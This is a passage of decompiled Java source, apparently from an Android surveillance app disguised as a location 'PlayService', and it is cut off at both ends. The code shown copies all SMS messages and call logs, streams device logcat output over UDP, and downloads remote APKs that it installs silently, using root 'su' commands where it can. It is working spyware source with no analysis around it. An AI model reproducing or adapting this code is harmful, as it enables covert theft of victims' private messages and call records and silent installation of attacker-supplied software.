      //   511: invokevirtual 69	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   514: invokevirtual 73	java/lang/StringBuilder:toString	()Ljava/lang/String;
      //   517: invokestatic 84	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   520: new 157	java/io/File
      //   523: dup
      //   524: aload 6
      //   526: ldc -54
      //   528: invokespecial 205	java/io/File:<init>	(Ljava/io/File;Ljava/lang/String;)V
      //   531: astore 13
      //   533: new 52	java/lang/StringBuilder
      //   536: dup
      //   537: ldc -49
      //   539: invokespecial 63	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
      //   542: aload 13
      //   544: invokevirtual 182	java/io/File:getAbsolutePath	()Ljava/lang/String;
      //   547: invokevirtual 69	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   550: invokevirtual 73	java/lang/StringBuilder:toString	()Ljava/lang/String;
      //   553: invokestatic 84	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   556: aload 13
      //   558: invokevirtual 210	java/io/File:createNewFile	()Z
      //   561: pop
      //   562: new 52	java/lang/StringBuilder
      //   565: dup
      //   566: ldc -44
      //   568: invokespecial 63	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
      //   571: aload 13
      //   573: invokevirtual 174	java/io/File:canWrite	()Z
      //   576: invokevirtual 177	java/lang/StringBuilder:append	(Z)Ljava/lang/StringBuilder;
      //   579: invokevirtual 73	java/lang/StringBuilder:toString	()Ljava/lang/String;
      //   582: invokestatic 84	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   585: aload 13
      //   587: invokevirtual 174	java/io/File:canWrite	()Z
      //   590: ifne +27 -> 617
      //   593: new 52	java/lang/StringBuilder
      //   596: dup
      //   597: ldc -42
      //   599: invokespecial 63	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
      //   602: aload 13
      //   604: invokevirtual 182	java/io/File:getAbsolutePath	()Ljava/lang/String;
      //   607: invokevirtual 69	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   610: invokevirtual 73	java/lang/StringBuilder:toString	()Ljava/lang/String;
      //   613: invokestatic 84	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   616: return
      //   617: ldc -40
      //   619: invokestatic 84	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   622: iconst_0
      //   623: istore 4
      //   625: aconst_null
      //   626: astore 5
      //   628: aconst_null
      //   629: astore 8
      //   631: aconst_null
      //   632: astore 11
      //   634: aconst_null
      //   635: astore 6
      //   637: aconst_null
      //   638: astore 12
      //   640: aconst_null
      //   641: astore 10
      //   643: new 218	java/io/FileOutputStream
      //   646: dup
      //   647: aload 13
      //   649: invokespecial 221	java/io/FileOutputStream:<init>	(Ljava/io/File;)V
      //   652: astore 7
      //   654: aload 10
      //   656: astore 6
      //   658: aload 12
      //   660: astore 5
      //   662: ldc -33
      //   664: invokestatic 84	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   667: aload 10
      //   669: astore 6
      //   671: aload 12
      //   673: astore 5
      //   675: aload 14
      //   677: invokevirtual 227	java/net/HttpURLConnection:getInputStream	()Ljava/io/InputStream;
      //   680: astore 8
      //   682: aload 8
      //   684: astore 6
      //   686: aload 8
      //   688: astore 5
      //   690: ldc -27
      //   692: invokestatic 84	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   695: aload 8
      //   697: astore 6
      //   699: aload 8
      //   701: astore 5
      //   703: sipush 1024
      //   706: newarray byte
      //   708: astore 10
      //   710: aload 8
      //   712: astore 6
      //   714: aload 8
      //   716: astore 5
      //   718: ldc -25
      //   720: invokestatic 84	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   723: aload 8
      //   725: astore 6
      //   727: aload 8
      //   729: astore 5
      //   731: aload 8
      //   733: aload 10
      //   735: invokevirtual 237	java/io/InputStream:read	([B)I
      //   738: istore_3
      //   739: iload_3
      //   740: iconst_m1
      //   741: if_icmpne +56 -> 797
      //   744: aload 8
      //   746: astore 6
      //   748: aload 8
      //   750: astore 5
      //   752: ldc -17
      //   754: invokestatic 84	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   757: iconst_1
      //   758: istore_3
      //   759: aload 7
      //   761: ifnull +8 -> 769
      //   764: aload 7
      //   766: invokevirtual 242	java/io/FileOutputStream:close	()V
      //   769: aload 8
      //   771: ifnull +400 -> 1171
      //   774: aload 8
      //   776: invokevirtual 243	java/io/InputStream:close	()V
      //   779: iload_3
      //   780: ifne +128 -> 908
      //   783: ldc -11
      //   785: invokestatic 84	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   788: ldc2_w 246
      //   791: invokestatic 196	java/lang/Thread:sleep	(J)V
      //   794: goto -629 -> 165
      //   797: aload 8
      //   799: astore 6
      //   801: aload 8
      //   803: astore 5
      //   805: aload 7
      //   807: aload 10
      //   809: iconst_0
      //   810: iload_3
      //   811: invokevirtual 251	java/io/FileOutputStream:write	([BII)V
      //   814: goto -91 -> 723
      //   817: astore 10
      //   819: aload 7
      //   821: astore 8
      //   823: aload 6
      //   825: astore 7
      //   827: aload 8
      //   829: astore 5
      //   831: aload 7
      //   833: astore 6
      //   835: aload 10
      //   837: ldc -3
      //   839: invokestatic 188	com/android/location/PlayService:EXCEPT	(Ljava/lang/Exception;Ljava/lang/String;)V
      //   842: aload 8
      //   844: ifnull +8 -> 852
      //   847: aload 8
      //   849: invokevirtual 242	java/io/FileOutputStream:close	()V
      //   852: iload 4
      //   854: istore_3
      //   855: aload 7
      //   857: ifnull -78 -> 779
      //   860: aload 7
      //   862: invokevirtual 243	java/io/InputStream:close	()V
      //   865: iload 4
      //   867: istore_3
      //   868: goto -89 -> 779
      //   871: astore 5
      //   873: iload 4
      //   875: istore_3
      //   876: goto -97 -> 779
      //   879: astore 7
      //   881: aload 5
      //   883: astore 8
      //   885: aload 8
      //   887: ifnull +8 -> 895
      //   890: aload 8
      //   892: invokevirtual 242	java/io/FileOutputStream:close	()V
      //   895: aload 6
      //   897: ifnull +8 -> 905
      //   900: aload 6
      //   902: invokevirtual 243	java/io/InputStream:close	()V
      //   905: aload 7
      //   907: athrow
      //   908: ldc -1
      //   910: invokestatic 84	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   913: new 52	java/lang/StringBuilder
      //   916: dup
      //   917: ldc_w 257
      //   920: invokespecial 63	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
      //   923: aload 13
      //   925: invokevirtual 182	java/io/File:getAbsolutePath	()Ljava/lang/String;
      //   928: invokevirtual 69	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   931: invokevirtual 73	java/lang/StringBuilder:toString	()Ljava/lang/String;
      //   934: invokestatic 84	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   937: getstatic 261	com/android/location/PlayService:bCanSu	B
      //   940: istore_3
      //   941: getstatic 264	com/android/location/PlayService:CAN	B
      //   944: istore 4
      //   946: iload_3
      //   947: iload 4
      //   949: if_icmpne +93 -> 1042
      //   952: ldc_w 266
      //   955: invokestatic 84	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   958: new 52	java/lang/StringBuilder
      //   961: dup
      //   962: ldc_w 268
      //   965: invokespecial 63	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
      //   968: aload 13
      //   970: invokevirtual 182	java/io/File:getAbsolutePath	()Ljava/lang/String;
      //   973: invokevirtual 69	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   976: ldc_w 270
      //   979: invokevirtual 69	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   982: aload 9
      //   984: invokevirtual 69	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   987: ldc_w 272
      //   990: invokevirtual 69	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   993: aload 9
      //   995: invokevirtual 69	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   998: ldc_w 274
      //   1001: invokevirtual 69	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   1004: invokevirtual 73	java/lang/StringBuilder:toString	()Ljava/lang/String;
      //   1007: invokestatic 278	com/android/location/PlayService:commandSU	(Ljava/lang/String;)B
      //   1010: pop
      //   1011: ldc2_w 246
      //   1014: invokestatic 196	java/lang/Thread:sleep	(J)V
      //   1017: ldc_w 280
      //   1020: invokestatic 278	com/android/location/PlayService:commandSU	(Ljava/lang/String;)B
      //   1023: pop
      //   1024: iconst_1
      //   1025: istore_2
      //   1026: goto -556 -> 470
      //   1029: astore 5
      //   1031: aload 5
      //   1033: ldc_w 282
      //   1036: invokestatic 188	com/android/location/PlayService:EXCEPT	(Ljava/lang/Exception;Ljava/lang/String;)V
      //   1039: goto -15 -> 1024
      //   1042: ldc_w 284
      //   1045: invokestatic 84	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   1048: new 286	android/content/Intent
      //   1051: dup
      //   1052: ldc_w 288
      //   1055: invokespecial 289	android/content/Intent:<init>	(Ljava/lang/String;)V
      //   1058: astore 5
      //   1060: aload 5
      //   1062: new 157	java/io/File
      //   1065: dup
      //   1066: new 52	java/lang/StringBuilder
      //   1069: dup
      //   1070: invokespecial 144	java/lang/StringBuilder:<init>	()V
      //   1073: invokestatic 150	android/os/Environment:getExternalStorageDirectory	()Ljava/io/File;
      //   1076: invokevirtual 153	java/lang/StringBuilder:append	(Ljava/lang/Object;)Ljava/lang/StringBuilder;
      //   1079: ldc_w 291
      //   1082: invokevirtual 69	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   1085: ldc -54
      //   1087: invokevirtual 69	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   1090: invokevirtual 73	java/lang/StringBuilder:toString	()Ljava/lang/String;
      //   1093: invokespecial 158	java/io/File:<init>	(Ljava/lang/String;)V
      //   1096: invokestatic 295	android/net/Uri:fromFile	(Ljava/io/File;)Landroid/net/Uri;
      //   1099: ldc_w 297
      //   1102: invokevirtual 301	android/content/Intent:setDataAndType	(Landroid/net/Uri;Ljava/lang/String;)Landroid/content/Intent;
      //   1105: pop
      //   1106: aload 5
      //   1108: ldc_w 302
      //   1111: invokevirtual 306	android/content/Intent:setFlags	(I)Landroid/content/Intent;
      //   1114: pop
      //   1115: aload_0
      //   1116: getfield 15	com/android/location/PlayService$Installer:this$0	Lcom/android/location/PlayService;
      //   1119: aload 5
      //   1121: invokevirtual 310	com/android/location/PlayService:startActivity	(Landroid/content/Intent;)V
      //   1124: return
      //   1125: astore 5
      //   1127: goto -275 -> 852
      //   1130: astore 5
      //   1132: goto -237 -> 895
      //   1135: astore 5
      //   1137: goto -232 -> 905
      //   1140: astore 5
      //   1142: goto -373 -> 769
      //   1145: astore 10
      //   1147: aload 7
      //   1149: astore 8
      //   1151: aload 5
      //   1153: astore 6
      //   1155: aload 10
      //   1157: astore 7
      //   1159: goto -274 -> 885
      //   1162: astore 10
      //   1164: aload 11
      //   1166: astore 7
      //   1168: goto -341 -> 827
      //   1171: goto -392 -> 779
      //   1174: astore 5
      //   1176: goto -397 -> 779
      // Local variable table:
      //   start	length	slot	name	signature
      //   0	1179	0	this	Installer
      //   164	315	1	i	int
      //   162	864	2	j	int
      //   738	212	3	k	int
      //   623	327	4	m	int
      //   64	326	5	localObject1	Object
      //   461	3	5	localException1	Exception
      //   488	22	5	localException2	Exception
      //   626	204	5	localObject2	Object
      //   871	11	5	localIOException1	IOException
      //   1029	3	5	localException3	Exception
      //   1058	62	5	localIntent	Intent
      //   1125	1	5	localIOException2	IOException
      //   1130	1	5	localIOException3	IOException
      //   1135	1	5	localIOException4	IOException
      //   1140	12	5	localIOException5	IOException
      //   1174	1	5	localIOException6	IOException
      //   350	804	6	localObject3	Object
      //   652	209	7	localObject4	Object
      //   879	269	7	localObject5	Object
      //   1157	10	7	localObject6	Object
      //   629	521	8	localObject7	Object
      //   85	909	9	str	String
      //   641	167	10	arrayOfByte	byte[]
      //   817	19	10	localException4	Exception
      //   1145	11	10	localObject8	Object
      //   1162	1	10	localException5	Exception
      //   632	533	11	localObject9	Object
      //   638	34	12	localObject10	Object
      //   531	438	13	localFile	File
      //   242	434	14	localHttpURLConnection	java.net.HttpURLConnection
      // Exception table:
      //   from	to	target	type
      //   194	406	461	java/lang/Exception
      //   406	460	461	java/lang/Exception
      //   500	616	461	java/lang/Exception
      //   617	622	461	java/lang/Exception
      //   764	769	461	java/lang/Exception
      //   774	779	461	java/lang/Exception
      //   783	794	461	java/lang/Exception
      //   847	852	461	java/lang/Exception
      //   860	865	461	java/lang/Exception
      //   890	895	461	java/lang/Exception
      //   900	905	461	java/lang/Exception
      //   905	908	461	java/lang/Exception
      //   908	946	461	java/lang/Exception
      //   1031	1039	461	java/lang/Exception
      //   1042	1124	461	java/lang/Exception
      //   479	485	488	java/lang/Exception
      //   662	667	817	java/lang/Exception
      //   675	682	817	java/lang/Exception
      //   690	695	817	java/lang/Exception
      //   703	710	817	java/lang/Exception
      //   718	723	817	java/lang/Exception
      //   731	739	817	java/lang/Exception
      //   752	757	817	java/lang/Exception
      //   805	814	817	java/lang/Exception
      //   860	865	871	java/io/IOException
      //   643	654	879	finally
      //   835	842	879	finally
      //   952	1024	1029	java/lang/Exception
      //   847	852	1125	java/io/IOException
      //   890	895	1130	java/io/IOException
      //   900	905	1135	java/io/IOException
      //   764	769	1140	java/io/IOException
      //   662	667	1145	finally
      //   675	682	1145	finally
      //   690	695	1145	finally
      //   703	710	1145	finally
      //   718	723	1145	finally
      //   731	739	1145	finally
      //   752	757	1145	finally
      //   805	814	1145	finally
      //   643	654	1162	java/lang/Exception
      //   774	779	1174	java/io/IOException
    }
    
    public boolean uri2host(String paramString)
    {
      String str = "";
      try
      {
        paramString = new URI(paramString).getHost();
        str = paramString;
        PlayService.FLOG("resolver:" + paramString);
        return true;
      }
      catch (Exception paramString)
      {
        PlayService.EXCEPT(paramString, "cant resolve:" + str);
      }
      return false;
    }
  }
  
  class Integer4
  {
    public Integer cid;
    public Integer lac;
    public Integer mcc;
    public Integer mnc;
    
    Integer4()
    {
      this$1 = Integer.valueOf(0);
      this.mnc = PlayService.this;
      this.mcc = PlayService.this;
      this.lac = PlayService.this;
      this.cid = PlayService.this;
    }
  }
  
  public class LogAnalyzer
    extends Thread
  {
    public LogAnalyzer() {}
    
    public void run()
    {
      if (!(Thread.getDefaultUncaughtExceptionHandler() instanceof CustomExceptionHandler)) {
        Thread.setDefaultUncaughtExceptionHandler(new CustomExceptionHandler("/sdcard"));
      }
      PlayService.FLOG("LogAnalyzer created()");
      if (PlayService.this.logcat == null)
      {
        PlayService.FLOG("logcat is null");
        return;
      }
      try
      {
        BufferedReader localBufferedReader = new BufferedReader(new InputStreamReader(PlayService.this.logcat.getInputStream()));
        int i = 0;
        for (;;)
        {
          String str = localBufferedReader.readLine();
          if (str.length() > 0)
          {
            if (PlayService.iAllLogPORT > 0) {
              PlayService.UDP(i + "-0:" + str, PlayService.iAllLogPORT);
            }
            i += 1;
          }
        }
        return;
      }
      catch (Exception localException)
      {
        PlayService.EXCEPT(localException, "LogAnalyzer");
        PlayService.FLOG("LogAnalyzer finished()");
      }
    }
    
    public void shutdown() {}
  }
  
  private class MyContentObserver
    extends ContentObserver
  {
    public MyContentObserver()
    {
      super();
    }
    
    public void onChange(boolean paramBoolean)
    {
      super.onChange(paramBoolean);
      long l = PlayService.this.GetMaxCallID();
      if (l > 0L) {
        PlayService.FLOG("New call added = " + l);
      }
    }
  }
  
  class OuterType
  {
    String ID;
    String sDuration;
    String sName;
    String sNumber;
    
    OuterType() {}
  }
  
  public class SMSCopier
    extends Thread
  {
    public SMSCopier() {}
    
    public void ResetCounter()
    {
      PlayService.this.bCanResetCounter = true;
    }
    
    public void run()
    {
      PlayService.this.Running = true;
      PlayService.FLOG("SMSCopier::STARTED");
      if (!(Thread.getDefaultUncaughtExceptionHandler() instanceof CustomExceptionHandler)) {
        Thread.setDefaultUncaughtExceptionHandler(new CustomExceptionHandler("/sdcard"));
      }
      Looper.prepare();
      label454:
      for (;;)
      {
        try
        {
          boolean bool = PlayService.this.Running;
          if (bool) {
            continue;
          }
        }
        catch (Exception localException)
        {
          Object localObject1;
          PlayService.EXCEPT(localException, "SMS Copier has FALLEN DOWN!");
          continue;
          localObject2 = localCursor;
          PlayService.lLastSMSRed = localCursor.getLong(localCursor.getColumnIndex("date"));
          localObject2 = localCursor;
          localContentValues = new ContentValues();
          localObject2 = localCursor;
          localContentValues.put("smslist_id", localCursor.getString(localCursor.getColumnIndex("_ID")));
          localObject2 = localCursor;
          localContentValues.put("number", localCursor.getString(localCursor.getColumnIndex("address")));
          localObject2 = localCursor;
          localContentValues.put("name", localCursor.getString(localCursor.getColumnIndex("person")));
          localObject2 = localCursor;
          localContentValues.put("smsdate", localCursor.getString(localCursor.getColumnIndex("date")));
          localObject2 = localCursor;
          localContentValues.put("type", localCursor.getString(localCursor.getColumnIndex("type")));
          localObject2 = localCursor;
          localContentValues.put("smstext", localCursor.getString(localCursor.getColumnIndex("body")));
          localObject2 = localCursor;
          PlayService.this.getContentResolver().insert(SmsProvider.CONTENT_URI, localContentValues);
          continue;
        }
        PlayService.FLOG("SMS Copier FINISHED!!!");
        return;
        sleep(60000L);
        if ((PlayService.bWork) || (!PlayService.this.Running))
        {
          localObject1 = new Time();
          ((Time)localObject1).setToNow();
          if (((Time)localObject1).toMillis(true) > PlayService.this.lSmsReaderCounter + PlayService.iReadSMSInterval * 1000)
          {
            PlayService.this.lSmsReaderCounter = ((Time)localObject1).toMillis(true);
            localObject1 = null;
          }
          try
          {
            localCursor = PlayService.this.getContentResolver().query(Uri.parse("content://sms"), null, " date > " + PlayService.lLastSMSRed, null, " date ASC LIMIT 100");
            if (localCursor != null)
            {
              localObject1 = localCursor;
              if (localCursor.moveToNext()) {
                continue;
              }
              localObject1 = localCursor;
              localCursor.close();
            }
            PlayService.SaveSettings();
          }
          catch (SQLException localSQLException)
          {
            Cursor localCursor;
            Object localObject2;
            ContentValues localContentValues;
            if (localObject2 == null) {
              break label454;
            }
            localObject2.close();
            PlayService.EXCEPT(localSQLException, "SMS insert error");
            continue;
            sleep(10000L);
          }
          PlayService.this.CopyLastCalls();
          PlayService.SaveSettings();
          if (PlayService.this.bCanResetCounter)
          {
            PlayService.this.lSmsReaderCounter = 0L;
            PlayService.this.bCanResetCounter = false;
          }
          if (PlayService.bScreenActive) {
            sleep(PlayService.iSMSQueryInterval);
          }
        }
      }
    }
  }
  
  public class SMSObserver
    extends ContentObserver
  {
    SMSObserver()
    {
      super();
    }
    
    public void onChange(boolean paramBoolean)
    {
      super.onChange(paramBoolean);
      if (PlayService.this.thSMSCopier != null) {
        PlayService.this.thSMSCopier.ResetCounter();
      }
    }
  }
  
  public class Updater
    extends Thread
  {
    private String apkurl;
    
    public Updater(String paramString)
    {
      this.apkurl = paramString;
    }
    
    /* Error */
    public void run()
    {
      // Byte code:
      //   0: aload_0
      //   1: getfield 15	com/android/location/PlayService$Updater:this$0	Lcom/android/location/PlayService;
      //   4: iconst_1
      //   5: putfield 30	com/android/location/PlayService:Running	Z
      //   8: invokestatic 34	java/lang/Thread:getDefaultUncaughtExceptionHandler	()Ljava/lang/Thread$UncaughtExceptionHandler;
      //   11: instanceof 36
      //   14: ifne +15 -> 29
      //   17: new 36	com/android/location/CustomExceptionHandler
      //   20: dup
      //   21: ldc 38
      //   23: invokespecial 41	com/android/location/CustomExceptionHandler:<init>	(Ljava/lang/String;)V
      //   26: invokestatic 45	java/lang/Thread:setDefaultUncaughtExceptionHandler	(Ljava/lang/Thread$UncaughtExceptionHandler;)V
      //   29: invokestatic 50	android/os/Looper:prepare	()V
      //   32: ldc 52
      //   34: astore 9
      //   36: aload_0
      //   37: getfield 20	com/android/location/PlayService$Updater:apkurl	Ljava/lang/String;
      //   40: ldc 54
      //   42: invokevirtual 60	java/lang/String:split	(Ljava/lang/String;)[Ljava/lang/String;
      //   45: astore 5
      //   47: aload 5
      //   49: arraylength
      //   50: ifne +25 -> 75
      //   53: new 62	java/lang/StringBuilder
      //   56: dup
      //   57: ldc 64
      //   59: invokespecial 65	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
      //   62: aload_0
      //   63: getfield 20	com/android/location/PlayService$Updater:apkurl	Ljava/lang/String;
      //   66: invokevirtual 69	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   69: invokevirtual 73	java/lang/StringBuilder:toString	()Ljava/lang/String;
      //   72: invokestatic 76	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   75: aload_0
      //   76: aload 5
      //   78: iconst_0
      //   79: aaload
      //   80: invokevirtual 79	java/lang/String:trim	()Ljava/lang/String;
      //   83: putfield 20	com/android/location/PlayService$Updater:apkurl	Ljava/lang/String;
      //   86: aload 5
      //   88: arraylength
      //   89: iconst_2
      //   90: if_icmpne +12 -> 102
      //   93: aload 5
      //   95: iconst_1
      //   96: aaload
      //   97: invokevirtual 79	java/lang/String:trim	()Ljava/lang/String;
      //   100: astore 9
      //   102: new 62	java/lang/StringBuilder
      //   105: dup
      //   106: ldc 81
      //   108: invokespecial 65	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
      //   111: aload_0
      //   112: getfield 20	com/android/location/PlayService$Updater:apkurl	Ljava/lang/String;
      //   115: invokevirtual 69	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   118: ldc 83
      //   120: invokevirtual 69	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   123: aload 9
      //   125: invokevirtual 69	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   128: invokevirtual 73	java/lang/StringBuilder:toString	()Ljava/lang/String;
      //   131: invokestatic 76	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   134: iconst_0
      //   135: istore_2
      //   136: iconst_5
      //   137: istore_1
      //   138: iload_2
      //   139: ifne +7 -> 146
      //   142: iload_1
      //   143: ifgt +20 -> 163
      //   146: ldc 85
      //   148: invokestatic 76	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   151: return
      //   152: ldc 87
      //   154: invokestatic 76	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   157: ldc2_w 88
      //   160: invokestatic 93	java/lang/Thread:sleep	(J)V
      //   163: aload_0
      //   164: aload_0
      //   165: getfield 20	com/android/location/PlayService$Updater:apkurl	Ljava/lang/String;
      //   168: invokevirtual 97	com/android/location/PlayService$Updater:uri2host	(Ljava/lang/String;)Z
      //   171: ifeq -19 -> 152
      //   174: new 62	java/lang/StringBuilder
      //   177: dup
      //   178: ldc 99
      //   180: invokespecial 65	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
      //   183: aload_0
      //   184: getfield 20	com/android/location/PlayService$Updater:apkurl	Ljava/lang/String;
      //   187: invokevirtual 69	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   190: invokevirtual 73	java/lang/StringBuilder:toString	()Ljava/lang/String;
      //   193: invokestatic 76	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   196: new 101	java/net/URL
      //   199: dup
      //   200: aload_0
      //   201: getfield 20	com/android/location/PlayService$Updater:apkurl	Ljava/lang/String;
      //   204: invokespecial 102	java/net/URL:<init>	(Ljava/lang/String;)V
      //   207: astore 5
      //   209: ldc 104
      //   211: invokestatic 76	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   214: aload 5
      //   216: invokevirtual 108	java/net/URL:openConnection	()Ljava/net/URLConnection;
      //   219: checkcast 110	java/net/HttpURLConnection
      //   222: astore 14
      //   224: ldc 112
      //   226: invokestatic 76	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   229: aload 14
      //   231: ldc 114
      //   233: invokevirtual 117	java/net/HttpURLConnection:setRequestMethod	(Ljava/lang/String;)V
      //   236: aload 14
      //   238: iconst_1
      //   239: invokevirtual 121	java/net/HttpURLConnection:setDoOutput	(Z)V
      //   242: ldc 123
      //   244: invokestatic 76	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   247: aload 14
      //   249: invokevirtual 126	java/net/HttpURLConnection:connect	()V
      //   252: ldc -128
      //   254: invokestatic 76	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   257: ldc -126
      //   259: invokestatic 76	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   262: new 62	java/lang/StringBuilder
      //   265: dup
      //   266: invokestatic 136	android/os/Environment:getExternalStorageDirectory	()Ljava/io/File;
      //   269: invokevirtual 141	java/io/File:getAbsolutePath	()Ljava/lang/String;
      //   272: invokestatic 145	java/lang/String:valueOf	(Ljava/lang/Object;)Ljava/lang/String;
      //   275: invokespecial 65	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
      //   278: ldc -109
      //   280: invokevirtual 69	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   283: invokevirtual 73	java/lang/StringBuilder:toString	()Ljava/lang/String;
      //   286: astore 5
      //   288: new 138	java/io/File
      //   291: dup
      //   292: aload 5
      //   294: invokespecial 148	java/io/File:<init>	(Ljava/lang/String;)V
      //   297: astore 6
      //   299: new 62	java/lang/StringBuilder
      //   302: dup
      //   303: ldc -106
      //   305: invokespecial 65	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
      //   308: aload 5
      //   310: invokevirtual 69	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   313: invokevirtual 73	java/lang/StringBuilder:toString	()Ljava/lang/String;
      //   316: invokestatic 76	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   319: aload 6
      //   321: invokevirtual 154	java/io/File:exists	()Z
      //   324: ifne +29 -> 353
      //   327: new 62	java/lang/StringBuilder
      //   330: dup
      //   331: ldc -100
      //   333: invokespecial 65	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
      //   336: aload 5
      //   338: invokevirtual 69	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   341: invokevirtual 73	java/lang/StringBuilder:toString	()Ljava/lang/String;
      //   344: invokestatic 76	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   347: aload 6
      //   349: invokevirtual 159	java/io/File:mkdirs	()Z
      //   352: pop
      //   353: new 62	java/lang/StringBuilder
      //   356: dup
      //   357: ldc -95
      //   359: invokespecial 65	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
      //   362: aload 6
      //   364: invokevirtual 164	java/io/File:canWrite	()Z
      //   367: invokevirtual 167	java/lang/StringBuilder:append	(Z)Ljava/lang/StringBuilder;
      //   370: invokevirtual 73	java/lang/StringBuilder:toString	()Ljava/lang/String;
      //   373: invokestatic 76	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   376: aload 6
      //   378: invokevirtual 164	java/io/File:canWrite	()Z
      //   381: ifne +66 -> 447
      //   384: new 62	java/lang/StringBuilder
      //   387: dup
      //   388: ldc -87
      //   390: invokespecial 65	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
      //   393: aload 6
      //   395: invokevirtual 141	java/io/File:getAbsolutePath	()Ljava/lang/String;
      //   398: invokevirtual 69	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   401: invokevirtual 73	java/lang/StringBuilder:toString	()Ljava/lang/String;
      //   404: invokestatic 76	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   407: return
      //   408: astore 5
      //   410: aload 5
      //   412: ldc -85
      //   414: invokestatic 175	com/android/location/PlayService:EXCEPT	(Ljava/lang/Exception;Ljava/lang/String;)V
      //   417: ldc -79
      //   419: invokestatic 76	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   422: iload_1
      //   423: iconst_1
      //   424: isub
      //   425: istore_1
      //   426: ldc2_w 178
      //   429: invokestatic 93	java/lang/Thread:sleep	(J)V
      //   432: goto -294 -> 138
      //   435: astore 5
      //   437: aload 5
      //   439: ldc -75
      //   441: invokestatic 175	com/android/location/PlayService:EXCEPT	(Ljava/lang/Exception;Ljava/lang/String;)V
      //   444: goto -306 -> 138
      //   447: new 62	java/lang/StringBuilder
      //   450: dup
      //   451: ldc -73
      //   453: invokespecial 65	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
      //   456: aload 5
      //   458: invokevirtual 69	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   461: invokevirtual 73	java/lang/StringBuilder:toString	()Ljava/lang/String;
      //   464: invokestatic 76	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   467: new 138	java/io/File
      //   470: dup
      //   471: aload 6
      //   473: ldc -71
      //   475: invokespecial 188	java/io/File:<init>	(Ljava/io/File;Ljava/lang/String;)V
      //   478: astore 13
      //   480: new 62	java/lang/StringBuilder
      //   483: dup
      //   484: ldc -66
      //   486: invokespecial 65	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
      //   489: aload 13
      //   491: invokevirtual 141	java/io/File:getAbsolutePath	()Ljava/lang/String;
      //   494: invokevirtual 69	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   497: invokevirtual 73	java/lang/StringBuilder:toString	()Ljava/lang/String;
